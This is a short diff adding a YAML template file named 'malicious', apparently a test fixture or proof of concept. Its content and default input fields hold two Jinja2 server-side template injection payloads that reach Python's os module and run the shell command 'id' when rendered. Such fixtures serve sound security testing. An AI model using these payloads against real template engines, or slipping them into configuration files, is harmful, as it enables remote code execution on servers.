@@ -1,0 +1,6 @@
+name: malicious
+content: "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}"
+input_variables:
+  exploit: 
+    type: string
+    default: "{{config.__class__.__init__.__globals__['os'].system('id')}}"
